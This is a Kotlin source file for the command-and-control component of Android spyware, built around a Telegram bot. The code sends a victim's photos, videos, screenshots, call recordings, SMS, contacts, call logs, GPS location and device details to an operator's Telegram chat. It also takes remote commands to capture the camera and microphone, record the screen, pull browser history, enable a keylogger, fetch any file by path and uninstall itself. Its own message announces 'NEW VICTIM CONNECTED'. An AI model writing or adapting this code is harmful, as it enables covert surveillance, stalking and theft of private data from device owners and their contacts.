package com.ddos.network

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class TelegramBot(
    private val token: String,
    private val chatId: String,
    private val context: Context
) {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private val lastUpdateId = context.getSharedPreferences("bot", Context.MODE_PRIVATE)

    // ========== UPLOAD METHODS ==========

    fun uploadMedia(file: File): Boolean {
        return try {
            val isVideo = file.extension in listOf("mp4", "mkv", "avi", "mov", "3gp")
            val endpoint = if (isVideo) "sendVideo" else "sendPhoto"
            val mediaType = if (isVideo) "video/mp4" else "image/jpeg"

            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart(
                    if (isVideo) "video" else "photo",
                    file.name,
                    file.asRequestBody(mediaType.toMediaType())
                )
                .addFormDataPart("caption",
                    "📱 ${getDeviceName()}\n" +
                    "📁 ${file.absolutePath}\n" +
                    "📏 ${file.length() / 1024} KB")
                .build()

            val request = Request.Builder()
                .url("https://api.telegram.org/bot$token/$endpoint")
                .post(body)
                .build()

            client.newCall(request).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            false
        }
    }

    fun uploadScreenshot(file: File): Boolean {
        return try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("photo", file.name,
                    file.asRequestBody("image/jpeg".toMediaType()))
                .addFormDataPart("caption",
                    "📸 SCREENSHOT\n📱 ${getDeviceName()}\n🕐 ${System.currentTimeMillis()}")
                .build()

            val request = Request.Builder()
                .url("https://api.telegram.org/bot$token/sendPhoto")
                .post(body)
                .build()

            client.newCall(request).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            false
        }
    }

    fun uploadAudio(file: File): Boolean {
        return try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("audio", file.name,
                    file.asRequestBody("audio/m4a".toMediaType()))
                .addFormDataPart("caption",
                    "📞 CALL RECORDING\n📱 ${getDeviceName()}\n📏 ${file.length() / 1024} KB")
                .build()

            val request = Request.Builder()
                .url("https://api.telegram.org/bot$token/sendAudio")
                .post(body)
                .build()

            client.newCall(request).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            false
        }
    }

    fun uploadVideo(file: File, caption: String): Boolean {
        return try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("video", file.name,
                    file.asRequestBody("video/mp4".toMediaType()))
                .addFormDataPart("caption",
                    "$caption\n📱 ${getDeviceName()}\n📏 ${file.length() / 1024 / 1024} MB")
                .build()

            val request = Request.Builder()
                .url("https://api.telegram.org/bot$token/sendVideo")
                .post(body)
                .build()

            client.newCall(request).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            false
        }
    }

    fun sendMessage(text: String) {
        try {
            val body = FormBody.Builder()
                .add("chat_id", chatId)
                .add("text", text)
                .build()

            val request = Request.Builder()
                .url("https://api.telegram.org/bot$token/sendMessage")
                .post(body)
                .build()

            client.newCall(request).execute()
        } catch (e: Exception) {
            // Silent
        }
    }

    fun sendLocation(latitude: Double, longitude: Double) {
        try {
            val body = FormBody.Builder()
                .add("chat_id", chatId)
                .add("latitude", latitude.toString())
                .add("longitude", longitude.toString())
                .build()

            val request = Request.Builder()
                .url("https://api.telegram.org/bot$token/sendLocation")
                .post(body)
                .build()

            client.newCall(request).execute()

            val address = getAddressFromLocation(latitude, longitude)
            sendMessage("📍 LOCATION\n🗺 $address\n📌 $latitude, $longitude")
        } catch (e: Exception) {
            // Silent
        }
    }

    fun sendSms(sender: String, body: String, time: Long, simSlot: Int, phoneNumber: String, carrier: String) {
        val text = """
            💬 NEW SMS
            📱 From: $sender
            📄 Body: $body
            🕐 Time: ${java.text.SimpleDateFormat("HH:mm:ss dd/MM/yyyy", java.util.Locale.US).format(java.util.Date(time))}
            📞 SIM: $simSlot
            ☎️ Number: $phoneNumber
            📡 Carrier: $carrier
        """.trimIndent()

        sendMessage(text)
    }

    fun sendDeviceInfo() {
        val text = """
            🚨 NEW VICTIM CONNECTED 🚨
            
            📱 Device: ${Build.MANUFACTURER} ${Build.MODEL}
            🤖 Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
            🆔 Device ID: ${getDeviceId()}
            🕐 Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())}
            📶 Battery: ${getBatteryLevel()}%
            🌐 IP: ${getIPAddress()}
        """.trimIndent()

        sendMessage(text)
        sendContacts()
    }

    private fun sendContacts() {
        try {
            val contacts = getContacts()
            val text = "📞 CONTACTS (${contacts.size}):\n" +
                    contacts.take(50).joinToString("\n") { "${it.first}: ${it.second}" }

            sendMessage(text)
        } catch (e: Exception) {
            sendMessage("❌ Contacts permission denied")
        }
    }

    private fun getContacts(): List<Pair<String, String>> {
        val contacts = mutableListOf<Pair<String, String>>()

        val cursor = context.contentResolver.query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null, null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(0) ?: "Unknown"
                val number = it.getString(1) ?: "No number"
                contacts.add(name to number)
            }
        }

        return contacts
    }

    // ========== COMMAND SYSTEM ==========

    fun checkCommands() {
        try {
            val offset = lastUpdateId.getLong("last_update", 0) + 1
            val request = Request.Builder()
                .url("https://api.telegram.org/bot$token/getUpdates?offset=$offset&timeout=10")
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return

                val json = JSONObject(response.body?.string() ?: return)
                val result = json.getJSONArray("result")

                for (i in 0 until result.length()) {
                    val update = result.getJSONObject(i)
                    val updateId = update.getLong("update_id")

                    if (update.has("message")) {
                        val message = update.getJSONObject("message")
                        if (message.has("text")) {
                            val text = message.getString("text")
                            val fromId = message.getJSONObject("from").getLong("id").toString()

                            if (fromId == chatId) {
                                processCommand(text)
                            }
                        }
                    }

                    lastUpdateId.edit().putLong("last_update", updateId).apply()
                }
            }
        } catch (e: Exception) {
            // Silent fail
        }
    }

    private fun processCommand(command: String) {
        when {
            command == "/stop" -> {
                context.getSharedPreferences("ddos_control", Context.MODE_PRIVATE)
                    .edit().putBoolean("upload_enabled", false).apply()
                sendMessage("⏸ Uploads STOPPED")
            }

            command == "/start" -> {
                context.getSharedPreferences("ddos_control", Context.MODE_PRIVATE)
                    .edit().putBoolean("upload_enabled", true).apply()
                sendMessage("▶ Uploads STARTED")
            }

            command == "/status" -> {
                val enabled = context.getSharedPreferences("ddos_control", Context.MODE_PRIVATE)
                    .getBoolean("upload_enabled", true)
                sendMessage("📊 Status: ${if (enabled) "ACTIVE" else "PAUSED"}\n📱 ${getDeviceName()}")
            }

            command == "/info" -> sendDeviceInfo()

            command == "/location" -> {
                val tracker = LocationTracker(context, this)
                tracker.startTracking()
                sendMessage("📍 Location tracking started")
            }

            command == "/camera" -> {
                val camera = CameraCapture(context, this)
                camera.capturePhoto()
                sendMessage("📸 Capturing photo...")
            }

            command == "/record" -> {
                val intent = Intent(context, ScreenshotService::class.java)
                intent.putExtra("record", true)
                context.startService(intent)
                sendMessage("🎥 Screen recording started (5 min)")
            }

            command == "/mic" -> {
                val mic = MicrophoneCapture(context, this)
                mic.startLiveCapture(5)
            }

            command == "/mic10" -> {
                val mic = MicrophoneCapture(context, this)
                mic.startLiveCapture(10)
            }

            command == "/history" -> {
                val browser = BrowserHistory(context, this)
                browser.extractHistory()
                sendMessage("🌐 Extracting browser history...")
            }

            command == "/keylogs" -> {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                context.startActivity(intent)
                sendMessage("⌨️ Enable accessibility service for keylogger")
            }

            command == "/calls" -> {
                sendCallLogs()
            }

            command == "/all" -> {
                sendDeviceInfo()
                LocationTracker(context, this).startTracking()
                CameraCapture(context, this).capturePhoto()
                BrowserHistory(context, this).extractHistory()
                sendMessage("🚀 FULL EXTRACTION STARTED")
            }

            command.startsWith("/get ") -> {
                val path = command.removePrefix("/get ")
                val file = File(path)
                if (file.exists()) {
                    uploadMedia(file)
                } else {
                    sendMessage("❌ File not found: $path")
                }
            }

            command == "/wipe" -> {
                sendMessage("🗑 Self-destruct initiated")
                val intent = Intent(Intent.ACTION_DELETE)
                intent.data = Uri.parse("package:${context.packageName}")
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                context.startActivity(intent)
            }

            command == "/help" -> {
                sendMessage("""
                    🎮 COMMANDS:
                    /start - Start uploads
                    /stop - Stop uploads
                    /status - Check status
                    /info - Device info
                    /location - Live GPS
                    /camera - Front camera
                    /record - Screen recording
                    /mic - Microphone 5 min
                    /mic10 - Microphone 10 min
                    /history - Browser history
                    /keylogs - Enable keylogger
                    /calls - Call logs
                    /all - Extract everything
                    /get <path> - Get file
                    /wipe - Self destruct
                """.trimIndent())
            }
        }
    }

    private fun sendCallLogs() {
        try {
            val cursor = context.contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null,
                android.provider.CallLog.Calls.DATE + " DESC LIMIT 20"
            )

            val logs = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(it.getColumnIndex(android.provider.CallLog.Calls.NUMBER))
                    val type = it.getInt(it.getColumnIndex(android.provider.CallLog.Calls.TYPE))
                    val date = it.getLong(it.getColumnIndex(android.provider.CallLog.Calls.DATE))

                    val typeStr = when (type) {
                        android.provider.CallLog.Calls.INCOMING_TYPE -> "📥 IN"
                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "📤 OUT"
                        android.provider.CallLog.Calls.MISSED_TYPE -> "❌ MISSED"
                        else -> "❓"
                    }

                    logs.add("$typeStr $number - ${java.text.SimpleDateFormat("dd/MM HH:mm", java.util.Locale.US).format(java.util.Date(date))}")
                }
            }

            sendMessage("📞 CALL LOGS:\n" + logs.joinToString("\n"))
        } catch (e: Exception) {
            sendMessage("❌ Call log permission denied")
        }
    }

    // ========== HELPERS ==========

    private fun getDeviceName(): String {
        return "${Build.MANUFACTURER} ${Build.MODEL}"
    }

    private fun getDeviceId(): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    private fun getBatteryLevel(): Int {
        val batteryIntent = context.registerReceiver(null,
            android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level != -1 && scale != -1) (level * 100 / scale) else -1
    }

    private fun getIPAddress(): String {
        return try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        return addr.hostAddress ?: "Unknown"
                    }
                }
            }
            "Unknown"
        } catch (e: Exception) {
            "Unknown"
        }
    }

    private fun getAddressFromLocation(lat: Double, lon: Double): String {
        return try {
            val geocoder = android.location.Geocoder(context, java.util.Locale.getDefault())
            val addresses = geocoder.getFromLocation(lat, lon, 1)
            addresses?.firstOrNull()?.getAddressLine(0) ?: "Unknown"
        } catch (e: Exception) {
            "Unknown"
        }
    }
}
